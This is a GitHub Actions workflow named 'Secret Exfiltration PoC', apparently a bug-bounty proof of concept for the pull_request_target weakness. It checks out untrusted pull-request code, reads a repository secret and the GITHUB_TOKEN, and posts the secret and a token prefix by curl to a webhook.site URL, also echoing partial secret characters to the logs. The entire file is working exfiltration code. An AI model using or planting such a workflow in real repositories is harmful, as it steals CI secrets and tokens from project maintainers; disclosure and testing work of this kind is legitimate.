
name: Secret Exfiltration PoC
on: 
  pull_request_target:
    types: [opened, synchronize, reopened]

jobs:
  prove-base-context:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR code
        uses: actions/checkout@v2
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      
      - name: Print Context Information
        run: |
          echo "=== CONTEXT INFORMATION ==="
          echo "Repository: ${{ github.repository }}"
          echo "Event Name: ${{ github.event_name }}"
          echo "Base Ref: ${{ github.base_ref }}"
          echo "Head Ref: ${{ github.head_ref }}"
          echo "Actor: ${{ github.actor }}"
          echo "=========================="
      
      - name: Exfiltrate TEST_HACKERONE Secret
        env:
          SECRET_VALUE: ${{ secrets.TEST_HACKERONE }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # Get webhook URL (create yours at webhook.site)
          WEBHOOK_URL="https://webhook.site/069b3073-d92e-4677-b186-be3499ade648"
          
          echo "Attempting to access secret..."
          
          # Exfiltrate the secret
          curl -X POST "$WEBHOOK_URL" \
            -H "Content-Type: application/json" \
            -d "{
              \"exploit\": \"secret_exfiltration_poc\",
              \"repository\": \"${{ github.repository }}\",
              \"secret_TEST_HACKERONE\": \"$SECRET_VALUE\",
              \"github_token_preview\": \"${GITHUB_TOKEN:0:20}...\",
              \"actor\": \"${{ github.actor }}\",
              \"event\": \"${{ github.event_name }}\",
              \"pr_number\": \"${{ github.event.pull_request.number }}\",
              \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%S+00:00)\"
            }"
          
          echo "Data exfiltrated to webhook"
          echo "Secret length: ${#SECRET_VALUE} characters"
          
          # Show partial secret (for log verification)
          if [ ! -z "$SECRET_VALUE" ]; then
            echo "Secret successfully accessed from base repository!"
            echo "First 5 chars: ${SECRET_VALUE:0:5}..."
          else
            echo "ERROR: Secret is empty - this means we're in fork context"
          fi
